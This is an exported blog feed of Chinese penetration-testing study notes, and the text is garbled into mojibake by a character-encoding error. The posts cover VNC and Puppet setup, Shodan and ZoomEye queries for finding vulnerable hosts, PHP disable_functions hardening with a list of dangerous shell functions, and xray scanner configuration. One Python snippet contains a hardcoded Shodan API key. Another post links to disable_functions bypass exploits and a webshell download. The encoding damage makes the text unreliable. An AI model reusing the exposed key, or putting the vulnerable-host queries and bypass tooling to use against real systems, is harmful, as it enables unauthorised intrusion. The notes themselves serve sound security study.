ä¸€ä¸ªvncå¯ä»¥å¯åŠ¨å¤šä¸ªä¾¦å¬ç«¯å£(é»˜è®¤ä»5901å¼€å§‹)ï¼Œä»ä¸åŒç«¯å£è¿æ¥ï¼Œæ‰“å¼€ä¸åŒä¼šè¯(æ¯ä¸ªç”¨æˆ·çœ‹åˆ°çš„æ¡Œé¢æ˜¯ä¸ä¸€æ ·çš„) # è‹¥åªä¾¦å¬ä¸€ä¸ªç«¯å£ï¼Œé€šè¿‡ä¸€ä¸ªç«¯å£è¿æ¥ï¼Œå¤šä¸ªç”¨æˆ·çœ‹åˆ°çš„éƒ½æ˜¯ä¸€ä¸ªæ¡Œé¢ # å»ºè®®ï¼šå¤šç”¨æˆ·ï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒæƒé™çš„ç”¨æˆ·ä¸‹(suè¿›å»ï¼Œè¿è¡Œå¯åŠ¨å®ä¾‹)ï¼Œè¿™æ ·ä¸åŒç”¨æˆ·è¿æ¥å°±æ˜¯ä¸åŒçš„æ¡Œé¢äº† è¿è¡Œé…ç½® vncserver # å¯åŠ¨vncæœåŠ¡ï¼ˆæ¥ä¸‹æ¥ä¼šè®©ä½ è¾“å…¥è¿æ¥å¯†ç å’Œåªè¯»å¯†ç ï¼‰ ~/.vnc/xstartup # ä¼šç”Ÿæˆè¿è¡Œæ–‡ä»¶ vncserver -kill:1 # åˆ æ‰è‡ªåŠ¨ç”Ÿæˆçš„å®ä¾‹ï¼ˆå› ä¸ºä¸ä¸€å®šæœ€é€‚åˆæˆ‘ä»¬çš„æ¡Œé¢ç¯å¢ƒã€‚å†’å·åé¢æ˜¯1æ˜¯5901,å¦‚æœæ˜¯2å°±æ˜¯5902ï¼‰ # å¤‡ä»½ä¸€ä¸‹æ–‡ä»¶ mv xstartup xstartup.bak # åˆ›å»ºæ–°è¿è¡Œæ–‡ä»¶ï¼Œ æ‰‹åŠ¨é…ç½®é€‚åˆæˆ‘ä»¬xfce4çš„vncé…ç½® vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp; # ä¿®æ”¹æƒé™ chmod +x ~/.vnc/xstartup # é‡æ–°è¿è¡Œ vncserver # tcpçš„5901ç«¯å£ # å°±å¯ä»¥åœ¨å®¢æˆ·ç«¯ç”¨å®¢æˆ·ç«¯è½¯ä»¶è¿æ¥äº†(æ¯”å¦‚ï¼šRemote Desktop Viewer) è¾“å…¥ip:ç«¯å£ # Note: æœåŠ¡å™¨ä¸Šï¼Œèƒ½å°‘å¼€ç«¯å£å°±å°‘å¼€ç«¯å£ï¼Œèƒ½å°‘å¼€æœåŠ¡å°±å°‘å¼€æœåŠ¡ å¤šç”¨æˆ· # æ¯ä¸ªç”¨æˆ·ä¸ç”¨ä¼šè¯ # åœ¨æ¯ä¸€ä¸ªä¸åŒæƒé™çš„ç”¨æˆ·ä¸‹(suè¿›å»ï¼Œè¿è¡Œå¯åŠ¨å®ä¾‹)ï¼Œè¿™æ ·ä¸åŒç”¨æˆ·è¿æ¥å°±æ˜¯ä¸åŒçš„æ¡Œé¢äº† su newuser1 vncserver ~/.vnc/xstartup vncserver -kill:2 vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp; chmod +x ~/.vnc/xstartup vncserver :2 # tcpçš„5902ç«¯å£ ps: vncçš„åŠ å¯†å¼ºåº¦ä¸æ˜¯å¾ˆé«˜ï¼Œæ‰€ä»¥ï¼šåœ¨ä¸éœ€è¦vncçš„æ—¶å€™ï¼Œå»ºè®®æ€æ‰vncè¿›ç¨‹(vncserver -kill:2) å› ä¸º vncçš„åŠ å¯†å¼ºåº¦æ²¡æœ‰sshé«˜ï¼Œæ‰€ä»¥ï¼Œå°è¯•ï¼šå…ˆå»ºç«‹sshéš§é“ï¼Œå†åœ¨éš§é“çš„åŸºç¡€ä¸Šå»ºç«‹å›¾å½¢åŒ–çš„è¿æ¥ PUPPETä¹Ÿæ˜¯ä¸€ä¸ªè¿œç¨‹ç®¡ç†å·¥å…·ï¼Œå¯ä»¥ä¸ç™»å½•åˆ°è¢«ç®¡ç†æœåŠ¡å™¨ä¸Šåˆ©ç”¨puppetçš„æœåŠ¡ç«¯(æˆ‘çš„æœºå™¨)æ¥ç®¡ç†puppetçš„å®¢æˆ·ç«¯(å®‰è£…åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Š)ï¼Œè¿›è¡Œæ‰¹é‡ç®¡ç†â€¦ å…¨ç”Ÿå‘½å‘¨æœŸçš„è¿œç¨‹ç®¡ç†æ–¹æ¡ˆ è½¯ä»¶å®‰è£…éƒ¨ç½²(å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åæ‰¹é‡ä¸‹å‘ç»™å®‰è£…æœ‰puppetå®¢æˆ·ç«¯çš„æœåŠ¡å™¨ä¸Š) æƒé™è®¾ç½® è´¦å·ç®¡ç† æ”¯æŒäº‘å¹³å° æ”¯æŒå®¹å™¨(Docker) é€‚åˆå¤§é‡æœåŠ¡å™¨ç®¡ç† å‡†å¤‡ # è¿™é‡Œä»¥ä¸¤å°æœºå™¨åšå®éªŒ # ä¸ºäº†åŒºåˆ†ï¼Œæ”¹ä¸€ä¸‹ä¸¤å°è®¡ç®—æœºå hostnamectrl set-hostname puppet hostnamectrl set-hostname client # ä¿®æ”¹hostsæ–‡ä»¶ï¼Œä¿®æ”¹è§£æåŸŸå(è¿™ä¸ªéšä¾¿èµ·) -- ä¸¤å°æœºå™¨éƒ½è¦ä¿®æ”¹ vim /etv/hosts 192.168.1.10 puppet.lab.com puppet 192.168.1.11 client.lab.com client # å…¶ä»–è¡Œéƒ½åˆ æ‰å°±è¡Œ # å¯ä»¥åœ¨dnsæœåŠ¡å™¨ä¸Šä¿®æ”¹ï¼Œè¿™é‡Œé€šè¿‡hostsä¿®æ”¹åŸŸåè§£æåªæ˜¯æƒå®œä¹‹è®¡(ä¸‹ä¸€ç« å­¦å®ŒDNSä¹‹åå°±åœ¨dnsæœåŠ¡å™¨ä¿®æ”¹åŸŸåçš„è§£æ) å®‰è£… # å®‰è£…puppetæœåŠ¡ç«¯ç¨‹åº sudo apt install puppetmaster # å®‰è£…puppetå®¢æˆ·ç«¯ç¨‹åº sudo apt install puppet é…ç½®æœåŠ¡ç«¯é…ç½®-1 cd /etc/puppet sudo mkdir -p modules/apache2/manifests # manifests ç›®å½•ä¸‹é¢å°±æ˜¯èµ„æºæ–‡ä»¶ touch init.pp # sudo vim /etc/puppet/modules/apache2/manifests/init.pp # æ¯”å¦‚è¦ç»™ä¸‹é¢çš„æœºå™¨å®‰è£…apache, # ä¸€ç»„èµ„æºå°±æ˜¯ä¸€ä¸ªç±» class apache2{ package{'apache2': # è½¯ä»¶åŒ… ensure=>installeds, } service{'apache2': # apacheçš„æœåŠ¡æ˜¯å¦å¯åŠ¨ ensure=>ture, ensure=>ture, require=>Package['apache2'], # åŒ…çš„åç§° } } æœåŠ¡ç«¯é…ç½®-2 # ä¸Šé¢çš„é…ç½®æ–‡ä»¶å®šä¹‰äº†èµ„æºï¼Œé‚£ä¹ˆè¿™é‡Œç¡®å®šè¦ç»™å“ªäº›æœåŠ¡å™¨å®‰è£…å“ªä¸ªèµ„æº # é€‰æ‹©å“ªä¸ªèµ„æº cd manifests touch site.pp # sudo vim /etc/puppet/manifests/site.pp # è§£æè¿™ä¸ªèŠ‚ç‚¹(é€šè¿‡åŸŸåè§£æåˆ°å¯¹åº”ip,åªè¦é‚£äº›è®¡ç®—æœºåœ¨è¿™ä¸ªåŸŸåå³å¯) node 'client.lab.com' { include apache2 # é€‰æ‹©ä¸‹å‘å“ªäº›èµ„æºã€‚è¿™é‡Œä»¥æ¨é€apache2èµ„æºä¸ºä¾‹ } # é‡å¯æœåŠ¡ systemctl restart puppetmaster.service å®¢æˆ·ç«¯é…ç½® # puppetçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ˜¯é€šè¿‡è¯ä¹¦æ¥é€šä¿¡ç­‰æ“ä½œçš„ # sudo vim /etc/default/puppet é»˜è®¤æ²¡æœ‰ï¼Œè‡ªå·±æ–°å»º START=yes # é‡å¯æœåŠ¡ï¼ˆä¼šè‡ªåŠ¨å‘puppetæœåŠ¡ç«¯å‘èµ·è¯·æ±‚ç”³è¯·è¯ä¹¦ï¼‰ systemctl restart puppet.service å®¢æˆ·ç«¯è¯ä¹¦å‰é¢è¯·æ±‚æµ‹è¯• # åœ¨æŸ¥çœ‹å®¢æˆ·ç«¯çš„æŒ‡çº¹ä¿¡æ¯ sudo puppet agent --figerprint # æœåŠ¡ç«¯ä¸‹é¢ä¸‹å‘è¯ä¹¦åï¼Œç„¶ååœ¨å®¢æˆ·ç«¯æµ‹è¯•ä¸€ä¸‹ï¼Œè·å–è¯ä¹¦ sudo puppet agent --test æœåŠ¡ç«¯è¯·æ±‚æŸ¥çœ‹ç­¾å # åœ¨æœåŠ¡ç«¯æŸ¥çœ‹å“ªäº›å®¢æˆ·ç«¯è·Ÿæˆ‘å‘èµ·è¯ä¹¦è¯·æ±‚äº† sudo puppet cert list # åœ¨æœåŠ¡ç«¯ä½¿ç”¨è‡ªå·±çš„ç§é’¥ç»™å¯¹åº”çš„æœºå™¨è¿›è¡Œç­¾å(sign) sudo puppet cert sign client.lab.com # å®¢æˆ·ç«¯æŸ¥çœ‹è¯ä¹¦ä¸‹å‘è¿›åº¦ï¼š sudo puppet agent --test å®Œæˆä¸Šé¢çš„æ­¥éª¤(èµ„æºçš„ä¸‹å‘é…ç½®ï¼Œè¯ä¹¦çš„è¯·æ±‚ä¸ç­¾åä¸‹å‘ï¼Œé‡å¯æœåŠ¡)ä¹‹åï¼Œåœ¨å®¢æˆ·ç«¯æŸ¥çœ‹apache2çš„æœåŠ¡å·²ç»å®‰è£…å¥½å¹¶å¯ç”¨äº† æ—¥å¿—çŠ¶æ€ä¿¡æ¯æŸ¥çœ‹ # æŸ¥çœ‹çŠ¶æ€ systemctl status puppet.service /var/log/syslog ä¸Šé¢å…³äºpuppetåªæ˜¯ç®€å•çš„ä¸€å°éƒ¨åˆ†ï¼Œåç»­é«˜çº§ç”¨æ³•ï¼Œè¯·è‡ªè¡Œæ¢ç´¢ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>è¿œç¨‹ç®¡ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é»‘æš—å¼•æ“]]></title>
    <url>%2Fposts%2F17232%2F</url>
    <content type="text"><![CDATA[ä¸€. shodan1.ç®€å•ä»‹ç»Shodanï¼Œæ˜¯ä¸€ä¸ªæš—é»‘ç³»çš„è°·æ­Œï¼Œä½œä¸ºä¸€ä¸ªé’ˆå¯¹ç½‘ç»œè®¾å¤‡çš„æœç´¢å¼•æ“ï¼Œå®ƒå¯ä»¥åœ¨æçŸ­çš„æ—¶é—´å†…åœ¨å…¨çƒè®¾å¤‡ä¸­æœç´¢åˆ°ä½ æƒ³æ‰¾çš„è®¾å¤‡ä¿¡æ¯ã€‚å¯¹äºæ¸—é€å·¥ä½œè€…æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè¾…åŠ©æˆ‘ä»¬å¯»æ‰¾é¶æœºçš„å¥½åŠ©æ‰‹ã€‚ 2.å†…ç½®è¯­æ³•# Shodançš„å‚æ•°æœ‰å¾ˆå¤šï¼Œè¿™é‡Œåªä»‹ç»ç®€å•çš„å‡ ç§ hostnameï¼š"ä¸»æœºæˆ–åŸŸå" å¦‚ hostname:"google'' portï¼š"ç«¯å£æˆ–æœåŠ¡" å¦‚ port:"21" ip : "ipåœ°å€" å¦‚ ip : "168.205.71.64" netï¼š"IPåœ°å€æˆ–å­ç½‘" å¦‚ net:"210.45.240.0/24" vuln :æŒ‡å®šæ¼æ´çš„cve å¦‚ vuln:CVE-2015-8869 ä½†æ˜¯è¿™ä¸ªå‘½ä»¤æœ€å¥½æ­é…èµ·æ¥ä½¿ç”¨ï¼Œå¦‚ country:CN vuln:CVE-2014-0160 os :"æ“ä½œç³»ç»Ÿ" â€‹ å¦‚ os:"centOS" ispï¼š"ISPä¾›åº”å•†" å¦‚ isp:"China Telecom" productï¼š"æ“ä½œç³»ç»Ÿ/è½¯ä»¶/å¹³å°" å¦‚ product:"Apache httpd" versionï¼š"è½¯ä»¶ç‰ˆæœ¬" å¦‚ version:"3.1.6" geoï¼š"ç»çº¬åº¦" å¦‚ geo:"39.8779,116.4550" country`ï¼š"å›½å®¶" å¦‚ country:"China" country:"UN" cityï¼š"åŸå¸‚" å¦‚ city:"Hefei" orgï¼š"ç»„ç»‡æˆ–å…¬å¸" å¦‚ org:"google" before/afterï¼š"æ—¥/æœˆ/å¹´" å¦‚ before:"25/09/2017" after:"25/09/2017" asn : "è‡ªæ²»ç³»ç»Ÿå·ç " å¦‚ asn:"AS2233" 3.è„šæœ¬ä½¿ç”¨ ï¼ˆå»ºè®®ä½¿ç”¨æœ¬åœ°è„šæœ¬ï¼Œä¹Ÿå¯è‡ªä¸»å¼€å‘ï¼‰é¡¹ç›®åœ°å€ï¼šhttps://github.com/achillean/shodan-python å…ˆclone, python setup.py install, shodan init ç§˜é’¥_value,ç„¶åå¯ä»¥åœ¨å‘½ä»¤è¡Œç”¨äº†å°±shodan search product:"apache" åªä¸è¿‡æ˜¾ç¤ºæ–¹å¼ä¸å‹å¥½ æ‹“å±•ï¼šè‡ªä¸»å¼€å‘ å®˜æ–¹æ–‡æ¡£ï¼šhttps://shodan.readthedocs.io/en/latest/index.html from shodan import Shodan api = Shodan("cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf") # Lookup an IP ipinfo = api.host('8.8.8.8') print(ipinfo) # Search for websites that have been "hacked" for banner in api.search_cursor('ch1_httpç›¸å…³.title:"hacked by"'): print(banner) # Get the total number of industrial control systems services on the Internet ics_services = api.count('tag:ics') print('Industrial Control Systems: {}'.format(ics_services['total'])) æ¡ˆä¾‹æµ‹è¯•ï¼š1.phpstudyé‡‡é›†å¤´éƒ¨ä¿¡æ¯ Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 2.å­åŸŸåä¿¡æ¯é‡‡é›†hostname:"xps.cn" 3.ç‰¹å®šæ¼æ´é¶æœºé‡‡é›†vuln:CVE-2020-1983 æ™®é€šç”¨æˆ·æ²¡æƒé™ç”¨ äºŒ. zoomeye å¯¹å›½å†…æ›´è´´è¿‘ä¸€äº› å†…ç½®è¯­æ³•ZoomEyeæœç´¢æŠ€å·§ æŒ‡å®šæœç´¢çš„ç»„ä»¶ä»¥åŠç‰ˆæœ¬ appï¼šç»„ä»¶åç§° verï¼šç»„ä»¶ç‰ˆæœ¬ ä¾‹å¦‚ï¼šæœç´¢ apacheç»„ä»¶ ç‰ˆæœ¬2.4 app:apache ver:2.4 æŒ‡å®šæœç´¢çš„ç«¯å£ port:ç«¯å£å· ä¾‹å¦‚ï¼šæœç´¢å¼€æ”¾äº†SSHç«¯å£çš„ä¸»æœº port:22 ä¸€äº›æœåŠ¡å™¨å¯èƒ½ç›‘å¬äº†éæ ‡å‡†çš„ç«¯å£ã€‚ è¦æŒ‰ç…§æ›´ç²¾ç¡®çš„åè®®è¿›è¡Œæ£€ç´¢ï¼Œå¯ä»¥ä½¿ç”¨serviceè¿›è¡Œè¿‡æ»¤ã€‚ æŒ‡å®šæœç´¢çš„æ“ä½œç³»ç»Ÿ OS:æ“ä½œç³»ç»Ÿåç§° ä¾‹å¦‚ï¼šæœç´¢Linuxæ“ä½œç³»ç»Ÿ OSï¼šLinux æŒ‡å®šæœç´¢çš„æœåŠ¡ serviceï¼šæœåŠ¡åç§° ä¾‹å¦‚ï¼Œæœç´ SSHæœåŠ¡ Serviceï¼šSSH æŒ‡å®šæœç´¢çš„åœ°ç†ä½ç½®èŒƒ countryï¼šå›½å®¶ cityï¼šåŸå¸‚å ä¾‹å¦‚ï¼š country:China cityï¼šBeijing æœç´¢æŒ‡å®šçš„CIDRç½‘æ®µ CIDR:ç½‘æ®µåŒºåŸŸ ä¾‹å¦‚ï¼š CIDRï¼š192.168.158.12/24 æœç´¢æŒ‡å®šçš„ç½‘ç«™åŸŸå Site:ç½‘ç«™åŸŸå ä¾‹å¦‚ï¼š site:www.baidu.com æœç´¢æŒ‡å®šçš„ä¸»æœºå Hostname:ä¸»æœºå ä¾‹å¦‚ï¼š hostname:zwl.cuit.edu.cn æœç´¢æŒ‡å®šçš„è®¾å¤‡å Deviceï¼šè®¾å¤‡å ä¾‹å¦‚ï¼š device:router æœç´¢å…·æœ‰ç‰¹å®šé¦–é¡µå…³é”®è¯çš„ä¸»æœº Keywordï¼šå…³é”®è¯ ä¾‹å¦‚ï¼š keyword:technology è„šæœ¬å¼€å‘(å¤šè¯­è¨€å¼€å‘)å®˜æ–¹æ‰‹å†Œ:https://www.zoomeye.org/doc 1.ç™»å½•æˆæƒ2.è¯·æ±‚æœç´¢3.å›æ˜¾æ•°æ® è¡¥å……ï¼šè°·æ­Œé»‘å®¢é«˜çº§ç©æ³•https://www.uedbox.com/shdb/ https://www.uedbox.com/post/54776/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>é»‘æš—å¼•æ“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPå¸¸è§å®‰å…¨è®¾ç½®]]></title>
    <url>%2Fposts%2F1940%2F</url>
    <content type="text"><![CDATA[PHP.INIä¸WEBå®‰å…¨å››ç§é˜²æŠ¤1.magic_quotes_gpcé­”æœ¯å¼•å·ï¼šè¿‡æ»¤è½¬ä¹‰å››ç§å­—ç¬¦ï¼ˆï¼‰ï¼Œå¯¹äºsqlæ³¨å…¥æœ‰è¿‡æ»¤ä½œç”¨ ç»•è¿‡ï¼š ç‰¹å®šæ¡ä»¶ä¸‹å¯ä»¥å°è¯•å®½å­—èŠ‚æ³¨å…¥ 2.safe_mod å®‰å…¨æ¨¡å¼ï¼Œå®˜æ–¹è‡ªå¸¦çš„ å®‰å…¨æ¨¡å¼ï¼š ç¦æ­¢phpä¸­æ•æ„Ÿå‡½æ•°ï¼Œé˜²å¾¡ææƒåŠåé—¨è°ƒç”¨ï¼Œæ¼æ´åˆ©ç”¨ä¸€äº›æ•æ„Ÿå‡½æ•°è¢«ç¦ç”¨ æœ‰æ—¶å€™ä¸å¼€å®‰å…¨æ¨¡å¼çš„åŸå› ï¼šè‡ªå·±å¼€å‘ä¸­ä¹Ÿéœ€è¦ä½¿ç”¨åˆ°æŸäº›æ•æ„Ÿå‡½æ•°ï¼Œä¸ç„¶å½±å“æ­£å¸¸åº”ç”¨ 3.open_basedirå¯ç”¨ä¹‹åï¼š open_basedir=D:\phpstudy\PHPTutorial\WWW`é™åˆ¶åé—¨çš„è®¿é—®æŒ‡å®šç›®å½•ï¼ˆèœåˆ€è¿ä¸Šä¹Ÿçœ‹ä¸åˆ°ç›®å½•é‡Œé¢ï¼‰ æ²¡åŠæ³•ç»•è¿‡ 4.disable_functionå¯è‡ªå®šä¹‰ç¦ç”¨å‡½æ•°ï¼šå®‰å…¨æ¨¡å¼(safe_mod)å‡çº§ç‰ˆï¼Œå¯è‡ªå®šä¹‰å‡½æ•°ç¦ç”¨ï¼Œæ›´åŠ çµæ´» dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link ä¸¾ä¾‹ï¼š disable_function = eval,system,fopen,fread,readdir,init_set //æ¯”å¦‚ç¦ç”¨æŸæŒ‡å®šå‡½æ•°çš„åšæ³• // å¯ä»¥ç›´æ¥å°æ€å¤§é©¬å°é©¬ç­‰åé—¨disable_functiondisable_function ç»•è¿‡disable_functionçš„çªç ´: æ–¹æ³•1ï¼šèšå‰‘åŠæ’ä»¶(ç»•è¿‡disable_function)ä½¿ç”¨, åŠ è½½æ’ä»¶æ’ä»¶ä¼šä¿å­˜åˆ°antData/pluginç›®å½•ç°åœ¨å¥½åƒå·²ç»ä¸ç”¨è‡ªå·±ä¸‹è½½è¿™ä¸ªæ’ä»¶äº† å‚è€ƒæ–‡ç« : https://www.cnblogs.com/linuxsec/articles/10966675.html æ–¹æ³•2ï¼š é’ˆå¯¹php7.x:ï¼ˆä¸æ”¯æŒwindowsï¼‰https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php æ–¹æ³•3ï¼š è„šæœ¬é›†åˆï¼šhttps://github.com/l3m0n/Bypass_Disable_functions_Shellhttp://webshell8.com/down/phpwebshell.zip æ–¹æ³•4ï¼šä¸€äº›webshellè‡ªå¸¦ç»•è¿‡åŠŸèƒ½ å…¶ä»–ç›®å½•æƒé™æ–‡ä»¶è§£æ â€¦ â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>php.ini</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xrayç®€å•å­¦ä¹ ]]></title>
    <url>%2Fposts%2F46596%2F</url>
    <content type="text"><![CDATA[xrayå­¦ä¹ å¹³æ—¶ä½¿ç”¨webscanæ˜¯æœ€å¤šçš„ ç»“åˆåŸºç¡€çˆ¬è™« xray.exe webscan --basic-crawler http://xxxxx # æœ‰å¼Šç«¯ï¼ˆçˆ¬è™«æ˜¯ä¸å—æˆ‘ä»¬æ§åˆ¶çš„ã€‚å¦‚æœæ˜¯ä»£ç†å°±è¡Œäº†:æˆ‘ä»¬ç‚¹å“ªé‡Œå°±æ‰«å“ªé‡Œï¼‰ åŸºæœ¬ä½¿ç”¨ä»£ç†åŸç† è®¾ç½®ä»£ç†æ­¥éª¤ å…¶ä¸­ï¼Œè¯ä¹¦çš„ç”Ÿæˆ(åªè¦ç¨‹åºä½ç½®ä¸å˜ï¼Œè¯ä¹¦å°±ä¸éœ€è¦é‡æ–°å®‰è£…)ï¼šca.crt, ç„¶åå®‰è£…è¯ä¹¦ ç”ŸæˆæŠ¥å‘Šå(å¯ä»¥è¾¹æ‰«è¾¹çœ‹)ï¼Œç‚¹å‡»å¯¹åº”æ¡ç›®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…·ä½“çš„è¯·æ±‚/å“åº”ä¿¡æ¯ç­‰ é«˜çº§ç”¨æ³•1.å¸¸ç”¨é…ç½® é…ç½®æ–‡ä»¶ï¼šconfig.yaml å…è®¸æ‰«æçš„åŸŸ Mitm -&gt; Restrictioné»˜è®¤ä¼šæŠŠæ‰€æœ‰æµé‡æ‰«æï¼Œå¯ä»¥æŒ‡å®šæˆ‘ä»¬æƒ³è¦æ‰«æçš„åŸŸåçš„æµé‡includeså…è®¸æ‰«æçš„åŸŸï¼Œ*è¡¨ç¤ºä»»æ„ï¼›excludesä¸å…è®¸æ‰«æçš„åŸŸ ä¸ºä»£ç†æ·»åŠ è®¤è¯ Mitm -&gt;authå¦‚æœæŠŠxrayæ”¾åˆ°å…¬ç½‘ä¸Šï¼Œåˆ«äººä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæˆ‘ä»¬å°±éœ€è¦è®¾ç½®è´¦å·å¯†ç  æ‰«ææ’ä»¶é…ç½® Pluginsæ’ä»¶å¯ä»¥æ‰“å¼€(enable:true)å’Œå…³é—­(false),ä¹Ÿå¯ä»¥è‡ªå®šä¹‰å­—å…¸ç­‰æˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡ŒæŒ‡å®šå¯ç”¨å“ªäº›æ’ä»¶ï¼š--plugins xss,xxe å‘åŒ…é€Ÿç‡é™åˆ¶ http -&gt; max_qpsé™åˆ¶æ‰«æé€Ÿåº¦ï¼Œé˜²æ­¢è¢«wafæ‹‰é»‘ æ‰«æä»£ç†é…ç½® http -&gt; proxyä»£ç†æ”¯æŒä»¥ä¸‹å½¢å¼ #1.httpä»£ç† http: proxy: "http://127.0.0.1:8080" # æ¼æ´æ‰«ææ—¶ä½¿ç”¨çš„ä»£ç† #2.socksä»£ç† http: proxy: "socks5://127.0.0.1:1111" # æ¼æ´æ‰«ææ—¶ä½¿ç”¨çš„ä»£ç† logå¦‚æœæ”¹æˆdebugï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“å‘åŒ…è¯·æ±‚è¯¦æƒ…ï¼š ä¹Ÿå¯ä»¥è®¾ç½®cookie å¤§è‡´é…ç½®é¡¹ï¼š 2.xrayä¸burpè”åŠ¨ä½¿ç”¨ï¼ˆ1ï¼‰Burpsuiteä½œä¸ºxrayçš„ä¸Šæ¸¸ä»£ç†ï¼ˆæŠ“å–xrayå‘åŒ…æ¥å­¦ä¹ ï¼‰ ä½œç”¨ï¼šburpå¯ä»¥æ‹¿åˆ°xrayçš„æ•°æ®åŒ…ï¼ˆå¯ä»¥å­¦ä¹ xrayæ˜¯å¦‚ä½•æ£€æµ‹çš„çš„ï¼‰ è®¾ç½®æ–¹æ³•ï¼š xrayè®¾ç½®ä»£ç†: http://127.0.0.1:8080 burpç›‘å¬8080ç«¯å£ å¯åŠ¨xrayï¼Œè®¾ç½®ç›‘å¬ç«¯å£ä¸º--listen 127.0.0.1:1111 æµè§ˆå™¨é…ç½®ä»£ç†ä¸º1111 ï¼ˆ2ï¼‰xrayä½œä¸ºBurpsuiteçš„ä¸Šæ¸¸ä»£ç†ï¼ˆååŠ©æµ‹è¯•ï¼‰ ä½œç”¨ï¼šburpå¯ä»¥é€‰æ‹©æ˜¯å¦æ”¾è¡Œï¼Œforwardä¹‹åï¼Œå¯ä»¥ç”¨xrayè¿›è¡Œæ‰«æ è®¾ç½®æ–¹æ³•ï¼š xrayé…ç½®æ–‡ä»¶ä¸é…ç½®ä»£ç† burpæ­£å¸¸è®¾ç½®ç›‘å¬8080ç«¯å£ burpæ‰“å¼€user option -&gt; Upstream Proxy Server -&gt; æ·»åŠ ä¸º:127.0.0.1:1111 æµè§ˆå™¨è®¾ç½®burpä»£ç†8080 å¯åŠ¨xrayï¼Œè®¾ç½®ç›‘å¬ç«¯å£ä¸º--listen 127.0.0.1:1111 å…¶ä»–æ–¹å¼ï¼šä½¿ç”¨æ’ä»¶ ä½¿ç”¨xrayç¼–å†™è‡ªå®šä¹‰pocxrayæ˜¯ç”¨goè¯­è¨€å¼€å‘çš„pocæ˜¯yamlæ ¼å¼çš„ åŸç† æ¯ä¸ªè§„åˆ™éƒ½æ˜¯httpè¯·æ±‚ï¼Œè¿›è¡Œæ”¹é€  POCæ„æˆ name rulesï¼šæœ€å…³é”®éƒ¨åˆ†ã€‚è¯·æ±‚æ–¹æ³•,è·¯å¾„,è¡¨è¾¾å¼(æœ‰å”¯ä¸€çš„è¿”å›å€¼)ã€‚æ”¯æŒå¤šæ¡(å°±ä¼šå‘é€å‡ æ¡æ•°æ®åŒ…) detailsï¼šæ¼æ´æ£€æµ‹æˆåŠŸä¹‹åï¼Œè¾“å‡ºä¸€äº›æç¤ºä¿¡æ¯ å…·ä½“æ“ä½œ çœ‹å®˜æ–¹æ–‡æ¡£ vscodeå’ŒjetBrainéƒ½è¡Œ vscodeå®‰è£…YAMLæŸ¥çœ‹ï¼Œé…ç½®æ–‡ä»¶setting.jsonç”¨æ¥æ ¡éªŒ æŒ‰ç…§ä¸Šé¢çš„æ ¼å¼ç¼–å†™ è¿è¡Œï¼šxray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111 å¯¹å•ä¸ªurlæ‰«æï¼š--url http://www.test.com æ›´å¥½ç”¨ Note: phantasmè¿™é‡Œæ˜¯åœ¨å‘½ä»¤è¡Œå¯ç”¨ è¯¦ç»†å†…å®¹æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ è°ƒè¯•pocçš„æ–¹æ³•ï¼šè®¾ç½®ä¸Šæ¸¸ä»£ç†ä¸ºburpï¼Œåœ¨burpæŸ¥çœ‹xrayå‘é€çš„æ•°æ®åŒ… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¸¸è§çš„ç®¡é“ç¬¦]]></title>
    <url>%2Fposts%2F62311%2F</url>
